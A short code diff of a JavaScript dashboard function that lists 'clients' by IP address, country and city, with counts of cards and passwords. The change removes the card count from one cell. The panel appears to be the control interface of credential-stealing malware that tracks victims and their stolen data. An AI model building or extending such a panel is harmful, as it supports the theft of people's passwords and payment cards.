@@ -44,7 +44,7 @@ function loadClients(query, page) {
 						'<span class="badge badge-dark">' + utToDate(row.time) + '</span></td>' +
 						'<td><span class="badge badge-dark"><a href=https://check-host.net/ip-info?host=' + row.ip + ' target=_blank>' + row.ip + '</a></span><br><span class="badge badge-dark">' + row.country + ' | ' + row.city + '</span></td>' +
 						'<td>' + (presents.length ? presents.join(" ") : "💩") + '</td>' +
-						'<td style="cursor:pointer" onclick="showInfo(\'ip\', \'' + row.ip + '\')"><span data-feather="credit-card"></span> ' + row.count_cards + '<br><span data-feather="lock"></span> ' + row.count_passwords + '</td>' +
+						'<td style="cursor:pointer" onclick="showInfo(\'ip\', \'' + row.ip + '\')"><br><span data-feather="lock"></span> ' + row.count_passwords + '</td>' +
 						'<td>' +
 						'<span class="badge badge-' + getStatus(row.checked).color + '">Check</span>' +
 						'<br>' +
